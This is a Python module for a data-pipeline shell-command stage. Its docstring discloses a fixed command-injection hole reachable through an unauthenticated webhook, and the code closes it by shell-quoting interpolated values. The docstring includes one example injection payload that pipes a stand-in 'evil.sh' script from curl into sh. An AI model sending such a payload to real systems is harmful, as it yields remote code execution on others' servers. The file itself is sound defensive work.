"""``ShellCommandStage`` — execute a shell command.

Mirrors Airflow's ``BashOperator``.  Useful as an escape hatch for ETL
operations that aren't covered by a typed stage yet: ad-hoc rsync, gpg
encryption, vendor-specific CLI tools, etc.

Security note: shell commands run with the same privileges as the
QueryStudio backend process.  Authoring the command IS admin-only
(``POST /api/dataflows`` is ``Depends(require_admin)``).

BUT "they cannot edit the command" was never the whole boundary, and
until 2026-09-13 this file said it was.  The command TEMPLATE supports
``{key}`` interpolation out of ``ctx.run_context``, and run_context is
supplied by whoever STARTS the run:

  * ``POST /api/dataflows/{name}/runs`` -> ``body.context`` (an admin, or
    an allow-listed ``api_consumer`` service key);
  * ``POST /api/webhooks/dataflow/{token}`` -> ``body["context"]``, with
    NO session auth at all -- the token is the auth, it is minted to be
    handed to an external system, and both ``allowed_ips`` and
    ``require_signature`` are optional.

So a template of ``rsync -av {src} {dest}`` plus a webhook body of
``{"context": {"src": "; curl evil.sh | sh; #"}}`` was remote code
execution as the backend process, for a principal holding nothing but a
trigger token.  Starting a run does not edit the command, but supplying
the values interpolated INTO it is enough.

The fix is to quote the untrusted half and leave the trusted half alone:
every interpolated VALUE goes through :func:`shlex.quote` (see
:class:`_ShellQuotedContext`), so a run_context value can only ever
become ONE literal argument -- never an operator, a redirect, a
substitution, or an extra argument.  The admin's template is untouched;
an admin who wants word-splitting writes the words in the template,
where authoring is already gated.  This holds for both modes:
``use_shell=True`` (metacharacters are neutralised by the quoting) and
``use_shell=False`` (``shlex.split`` reverses the quoting back into
exactly one token, so argument injection is closed too).

The quoting is POSIX (``shlex.quote``/``shlex.split``), matching what
this module already assumed; on a Windows host ``shell=True`` runs
cmd.exe, which does not read POSIX quotes -- a value would arrive with
literal quote characters rather than being re-split.  That is a broken
command, not an injection, and deployment is Linux.

We log the command AS RUN (post-quoting) into the run's log_lines, so
the audit trail shows what actually executed.
"""
from __future__ import annotations

import os
import shlex
import subprocess
from typing import Any, Dict, List

from core.dataflow.base import (
    BaseStage, CATEGORY_CONTROL, IDEMPOTENT_CONFIGURED,
)
from core.dataflow.context import StageContext, StageResult
from core.dataflow.registry import register


class _ShellQuotedContext(dict):
    """``run_context`` mapping that shell-quotes every value it yields.

    Used with ``str.format_map`` so that ``"rsync {src}".format_map(...)``
    can only ever place ONE literal argument at ``{src}``, whatever the
    run-starter put in it.  See this module's docstring for the boundary:
    the command template is admin-authored, the values are not.

    ``format_map`` calls ``__getitem__`` per placeholder, so quoting here
    covers every position; a missing key still raises ``KeyError``, which
    ``execute`` maps to "leave the template unformatted" exactly as before.
    """

    def __getitem__(self, key: Any) -> str:
        return shlex.quote(str(super().__getitem__(key)))


@register
class ShellCommandStage(BaseStage):
    NAME = "shell_command"
    DISPLAY_NAME = "Shell Command"
    CATEGORY = CATEGORY_CONTROL
    DESCRIPTION = ("Run a shell command.  Captures stdout/stderr into outputs "
                     "and fails the stage on non-zero exit unless allowed_exit_codes lists it.")
    IDEMPOTENCY = IDEMPOTENT_CONFIGURED
    CONFIG_SCHEMA = {
        "command":       {"type": "string",
                            "description": "Command line to run.  Supports {key} interpolation. "
                                            "Example: 'rsync -av {src} {dest}'"},
        "cwd":           {"type": "string",
                            "description": "Working directory (default: process cwd)."},
        "env":           {"type": "object",
                            "description": "Extra environment variables (merged with the process env)."},
        "timeout_seconds": {"type": "integer", "minimum": 1,
                              "description": "Kill the process after this many seconds (default 300)."},
        "allowed_exit_codes": {"type": "array",
                                 "description": "Exit codes that are treated as success (default [0])."},
        "use_shell":     {"type": "boolean",
                            "description": "Run via shell so pipes/redirects work (default false). "
                                            "When false, command is split with shlex (safer)."},
        "capture_lines": {"type": "integer", "minimum": 0,
                            "description": "Max stdout/stderr lines to surface in outputs (default 200)."},
    }

    @classmethod
    def validate_config(cls, config: Dict[str, Any]) -> List[str]:
        errs: List[str] = []
        cmd = (config.get("command") or "").strip()
        if not cmd:
            errs.append("command is required")
        return errs

    def execute(self, ctx: StageContext) -> StageResult:
        cmd_template = ctx.get_config("command", "")
        try:
            # NOT ``.format(**ctx.run_context)``: run_context is
            # run-starter-controlled (a webhook token holder can set it with
            # no session auth) and went into the shell verbatim.  Quoting
            # each value confines it to one literal argument.
            cmd = cmd_template.format_map(_ShellQuotedContext(ctx.run_context))
        except Exception:
            cmd = cmd_template

        cwd = ctx.get_config("cwd") or None
        extra_env = ctx.get_config("env") or {}
        timeout = float(ctx.get_config("timeout_seconds", 300))
        allowed = set(ctx.get_config("allowed_exit_codes") or [0])
        use_shell = bool(ctx.get_config("use_shell", False))
        cap_lines = int(ctx.get_config("capture_lines", 200))

        env = {**os.environ, **{str(k): str(v) for k, v in extra_env.items()}}
        ctx.log(f"$ {cmd}")

        try:
            if use_shell:
                args = cmd
            else:
                args = shlex.split(cmd)
            p = subprocess.Popen(
                args, cwd=cwd, env=env, shell=use_shell,
                stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                text=True,
            )
            try:
                out, err = p.communicate(timeout=timeout)
            except subprocess.TimeoutExpired:
                p.kill()
                p.communicate()
                return StageResult.failed(
                    error=f"command timed out after {timeout}s",
                    outputs={"command": cmd, "timed_out": True},
                )
        except Exception as exc:
            return StageResult.failed(error=f"failed to start command: {exc}")

        # Tail the captured streams to cap memory + dashboard payload size
        stdout_lines = (out or "").splitlines()[-cap_lines:]
        stderr_lines = (err or "").splitlines()[-cap_lines:]

        outputs: Dict[str, Any] = {
            "command":       cmd,
            "exit_code":     p.returncode,
            "stdout_tail":   stdout_lines,
            "stderr_tail":   stderr_lines,
        }
        if p.returncode in allowed:
            ctx.log(f"exit {p.returncode} (allowed)")
            return StageResult.succeeded(outputs=outputs)
        return StageResult.failed(
            error=f"command exited {p.returncode} (allowed: {sorted(allowed)})",
            outputs=outputs,
        )
